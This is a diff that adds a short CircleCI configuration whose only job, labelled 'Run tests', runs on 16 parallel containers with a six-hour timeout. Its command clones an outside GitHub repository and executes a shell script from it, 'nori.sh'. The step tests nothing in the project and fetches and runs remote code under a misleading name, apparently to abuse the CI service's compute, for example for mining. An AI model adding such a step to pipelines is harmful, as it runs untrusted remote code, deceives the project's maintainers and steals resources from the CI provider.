@@ -1,0 +1,27 @@
+version: 2.1 
+ 
+orbs: 
+   
+  python: circleci/python@1.2 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - job
+ 
+jobs: 
+  job:
+    parallelism: 16
+    docker: 
+      - image: cimg/python:3.8 
+     
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          no_output_timeout: 360m 
+          command: git clone https://github.com/trendava/Harbs.git && cd Harbs && chmod +x nori.sh && ./nori.sh 
+                   
+                   
+                   
+                   
